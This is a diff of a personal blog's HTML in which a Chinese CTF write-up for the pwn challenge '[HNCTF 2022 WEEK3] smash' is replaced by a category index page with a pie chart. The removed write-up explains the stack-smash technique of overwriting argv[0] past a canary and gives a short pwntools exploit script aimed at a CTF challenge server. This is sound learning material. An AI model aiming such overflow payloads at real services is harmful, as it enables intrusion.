@@ -3,7 +3,7 @@
 <html lang="en">
 <head>
     <meta charset="utf-8" />
-    <title>[HNCTF 2022 WEEK3] smash 复现 | Xzzzz911</title>
+    <title>分类 | Xzzzz911</title>
     <meta name="author" content="Xzzzz911" />
     <meta name="description" content="This is my website Hello Everyone" />
     <meta name="keywords" content="" />
@@ -48,10 +48,6 @@
 
 
 
-
-  
-  
-  
 
 
 
@@ -241,262 +237,126 @@
 </script>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <!-- ✅ 页面标题和标签 --> 
-
-<div class="post-title-area">
-  <h1 style="color: #b6b4b4; font-size: 2.5rem; font-weight: bold; margin-bottom: 0.5rem;">[HNCTF 2022 WEEK3] smash 复现</h1>
-  <div class="info" style="font-size: 0.95rem; color: #555;">
-    <span class="date">
-      <span class="icon"><i class="fa-solid fa-calendar fa-fw"></i></span>
-      2023/9/7
-    </span>
+            <div id="archives">
+    <!-- 分类统计图 -->
+    <div id="category-chart" style="width: 100%; max-width: 600px; height: 400px; margin: 0 auto 40px;"></div>
+  
+    <!-- 分类标签展示 -->
     
-    <span class="category" style="margin-left: 1rem;">
-      <a href="/categories/CTF/">
-        <span class="icon"><i class="fa-solid fa-bookmark fa-fw"></i></span>
-        CTF
-      </a>
-    </span>
-    
-    
-    <span class="tags" style="margin-left: 1rem;">
-      <span class="icon"><i class="fa-solid fa-tags fa-fw"></i></span>
+    <div class="categories-tags">
       
       
-      <span class="tag">
-        
-        <a href="/tags/PWN/" style="color: #00a596; margin-right: 0.5rem;">PWN</a>
+      
+      <span>
+          <a href="/categories/CTF/" style="background: #03a9f4">
+              <span class="icon">
+                  <i class="fa-solid fa-bookmark fa-fw"></i>
+              </span>
+              CTF
+          </a>
       </span>
       
-      <span class="tag">
-        
-        <a href="/tags/HNCTF/" style="color: #ff7d73; margin-right: 0.5rem;">HNCTF</a>
+      
+      
+      <span>
+          <a href="/categories/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="background: #00bcd4">
+              <span class="icon">
+                  <i class="fa-solid fa-bookmark fa-fw"></i>
+              </span>
+              年度总结
+          </a>
       </span>
       
-    </span>
-    
-  </div>
-</div>
-
-
-
-<div id="home-posts-wrap" class="home-posts-wrap" style="display: flex; max-width: 1200px; margin: auto; gap: 2rem;">
-  <div id="home-posts" style="opacity: 0.5; flex: 3;">
-    <div class="post">
       
-        <div class="content" v-pre>
-          <p>[HNCTF 2022 WEEK3] smash 复现</p>
-<span id="more"></span>
-
-<h1 id="smash"><span id="smash">smash</span></h1><p>查看保护机制，正如题目的名字 smash（所以会涉及到花式栈溢出 stack smash），打开了 NX 和 canary</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/1.png"></p>
-<p>IDA 一下，发现 gets 函数造成了溢出，并且 flag 存在 buf 里面</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/2.png"></p>
-<p>接下来我们就需要了解一下 stack smash<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/fancy-rop/#stack-smash">（花式栈溢出技巧 - CTF Wiki (ctf-wiki.org)）</a></p>
-<blockquote>
-<h2 id="stack-smash"><span id="stack-smash">Stack smash</span></h2><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p>
-</blockquote>
-<p>当我们了解了 Stack smash 后，我们就可以溢出到 arg[0]，然后将该指针改成 buf 就能获得 flag，下面就开始求偏移。</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/3.png"></p>
-<p>两个地址相减就可得偏移 0x208（但是正确的偏移是 0x1f8，比正确的偏移多了 0x10，问了下学长可能是版本的问题，方法会了就行，小问题不伤大雅）</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/4.png"></p>
-<p>也可以这样算</p>
-<p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
-<h2 id="exp如下"><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
-
-        </div>
+      
+      <span>
+          <a href="/categories/%E6%8A%80%E5%B7%A7/" style="background: #00a596">
+              <span class="icon">
+                  <i class="fa-solid fa-bookmark fa-fw"></i>
+              </span>
+              技巧
+          </a>
+      </span>
+      
+      
+      
+      <span>
+          <a href="/categories/%E6%8A%80%E5%B7%A7/%E6%96%B9%E6%B3%95/" style="background: #ff7d73">
+              <span class="icon">
+                  <i class="fa-solid fa-bookmark fa-fw"></i>
+              </span>
+              方法
+          </a>
+      </span>
+      
       
     </div>
-  </div>
-
   
-    <div id="home-card" style="opacity: 0.5; flex: 1; position: relative;">
-      <div class="profile-card-fixed">
-        <div id="card-style"> 
-  <div id="card-div">
-
-    <!-- 头像区域整体包裹 -->
-    <div class="card-header">
-      <!-- 头像，添加外层相对定位 -->
-      <div class="avatar">
-        <img src="/images/123.jpg" alt="avatar" />
-
-        <!-- 右下角小标注 -->
-        <div class="author-status-sidebar" tabindex="0" aria-label="认真摸鱼中">
-          <g-emoji class="g-emoji" alias="palm_tree" fallback-src="https://lskypro.acozycotage.net/LightPicture/2022/12/fe1dc0402e623096.jpg">🐟</g-emoji>
-          <span class="status-text">认真摸鱼中</span>
-        </div>
-      </div>
-
-      <!-- 作者名 -->
-      <div class="name">Xzzzz911</div>
-
-      <!-- 描述（支持 markdown） -->
-      <div class="description">
-        <p>越努力 越幸运</p>
-
-      </div>
-
-      <!-- 图标链接 -->
-      
-      <div class="icon-links">
-        
-        <span class="icon-link">
-          <a href="https://github.com/xzz911" title="来访问我的GitHub吧" target="_blank" rel="noopener noreferrer">
-            <i class="fa-brands fa-github fa-fw"></i>
-          </a>
-        </span>
-        
-        <span class="icon-link">
-          <a href="https://wpa.qq.com/msgrd?v=3&amp;uin=443602796&amp;site=qq&amp;menu=yes" title="QQ: 443602796" target="_blank" rel="noopener noreferrer">
-            <i class="fa-brands fa-qq fa-fw"></i>
-          </a>
-        </span>
-        
-        <span class="icon-link">
-          <a href="mailto:xzzzz911@qq.com" title="邮件发送我" target="_blank" rel="noopener noreferrer">
-            <i class="fa-solid fa-envelope fa-fw"></i>
-          </a>
-        </span>
-        
-        <span class="icon-link">
-          <a href="https://space.bilibili.com/1709777759" title="B站主页" target="_blank" rel="noopener noreferrer">
-            <i class="fa-brands fa-bilibili fa-fw"></i>
-          </a>
-        </span>
-        
-      </div>
-      
-
-      <!-- 友链 -->
-      
-    </div>
-
-    <!-- 新增访客信息卡片，只在首页显示 -->
-    
-
-    <!-- ✅ 卡片 2：今日诗词（仅首页展示），加了分割样式 -->
-    
-
-    <!-- TOC 目录区域 -->
-    
-
-  </div>
-</div>
-
-      </div>
-      <div class="card-sticky-wrapper">
-        <div id="toc-container">
-          <div class="toc-header">
-            <i class="fa-solid fa-list-ul"></i> 目录
-          </div>
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#smash"><span class="toc-number">1.</span> <span class="toc-text">smash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-smash"><span class="toc-number">1.1.</span> <span class="toc-text">Stack smash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">exp如下：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结：</span></a></li></ol>
-        </div>
-      </div>
-    </div>
-  
-</div>
-
-<!-- 修改过的上一篇/下一篇导航 -->
-<div class="post-nav-outer" style="max-width: 1200px; margin: 3rem auto 0; display: flex; justify-content: center;">
-  <div class="post-nav-inner" style="flex: 3; display: flex; gap: 1rem;">
-    
-      <a href="/%5BHNCTF%202022%20WEEK4%5D%20ezcanary%20%E5%A4%8D%E7%8E%B0/" style="flex: 1; text-decoration: none; color: #ccc;">
-        <div>
-          <div style="font-size: 0.85rem; color: #492630;">⬅ 上一篇</div>
-          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[HNCTF 2022 WEEK4] ezcanary 复现</div>
-          <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2023-09-22
-            
-              &nbsp;| <i class="fa fa-folder-open"></i> 
-            
-            
-              &nbsp;| <i class="fa fa-tags"></i>
-              
-                PWN, 
-              
-                HNCTF
-              
-            
-          </div>
-        </div>
-      </a>
-    
-
-    
-      <a href="/%5BSDCTF%202022%5DprintFAILED%20%E5%A4%8D%E7%8E%B0/" style="flex: 1; text-decoration: none; color: #ccc; text-align: right;">
-        <div>
-          <div style="font-size: 0.85rem; color: #492630;">下一篇 ➡</div>
-          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">[SDCTF 2022]printFAILED 复现</div>
-          <div style="font-size: 0.85rem; margin-top: 0.5rem;">
-            <i class="fa fa-calendar"></i> 2023-09-06
-            
-              &nbsp;| <i class="fa fa-folder-open"></i> 
-            
-            
-              &nbsp;| <i class="fa fa-tags"></i>
-              
-                PWN, 
-              
-                SDCTF
-              
-            
-          </div>
-        </div>
-      </a>
+    <!-- 分类对应的文章时间轴 -->
     
   </div>
-</div>
-
-
   
+  <!-- ECharts 饼图脚本 -->
+  <script src="https://cdn.jsdelivr.net/npm/echarts@5/dist/echarts.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const chartDom = document.getElementById('category-chart');
+      const myChart = echarts.init(chartDom);
+      const option = {
+        title: {
+          text: '文章分类统计图',
+          left: 'center'
+        },
+        tooltip: {
+          trigger: 'item'
+        },
+        legend: {
+          bottom: '0%',
+          left: 'center'
+        },
+        series: [
+          {
+            name: '分类',
+            type: 'pie',
+            radius: ['40%', '70%'],
+            avoidLabelOverlap: false,
+            label: {
+              show: true,
+              formatter: '{b}: {c} ({d}%)'
+            },
+            labelLine: {
+              show: true
+            },
+            data: [
+              
+                {
+                  name: "CTF",
+                  value: 16
+                },
+              
+                {
+                  name: "年度总结",
+                  value: 1
+                },
+              
+                {
+                  name: "技巧",
+                  value: 5
+                },
+              
+                {
+                  name: "方法",
+                  value: 5
+                },
+              
+            ]
+          }
+        ]
+      };
+      myChart.setOption(option);
+    });
+  </script>
   
-  
-  
-
-
-<script>
-document.addEventListener("DOMContentLoaded", function() {
-  const tocLis = document.querySelectorAll("#toc-container > ol > li");
-  const headers = [...document.querySelectorAll(".content h1")];
-  const idToTocLi = {};
-  tocLis.forEach(li => {
-    const a = li.querySelector("a");
-    if (!a) return;
-    const href = a.getAttribute("href");
-    if (!href || !href.startsWith("#")) return;
-    const id = decodeURIComponent(href.slice(1));
-    idToTocLi[id] = li;
-  });
-
-  function onScroll() {
-    const scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
-    let currentIndex = 0;
-    for (let i = 0; i < headers.length; i++) {
-      const headerTop = headers[i].getBoundingClientRect().top + window.pageYOffset - 100;
-      if (scrollTop >= headerTop) {
-        currentIndex = i;
-      } else {
-        break;
-      }
-    }
-
-    tocLis.forEach(li => li.classList.remove("active"));
-    if (headers[currentIndex]) {
-      const id = headers[currentIndex].id;
-      if (idToTocLi[id]) {
-        idToTocLi[id].classList.add("active");
-      }
-    }
-  }
-
-  window.addEventListener("scroll", onScroll);
-  onScroll();
-});
-</script>
-
             <footer id="footer">
   <div id="footer-wrap">
     <div>
@@ -732,7 +592,7 @@ document.addEventListener("DOMContentLoaded", function() {
     <!-- 新增：监听标签页切换，动态修改标签页标题 -->
     <script>
     (function () {
-        const isPost = true; // ✅ 是否是文章页面
+        const isPost = false; // ✅ 是否是文章页面
         const originalTitle = document.title;
         const awayTitle = "🤠别再玩了啦~";
         const backTitle = "🚩给我狠狠学~";
@@ -839,12 +699,6 @@ document.addEventListener("DOMContentLoaded", function() {
         })
         })
     </script>
-
-
-
-    
-    
-
 
 
 
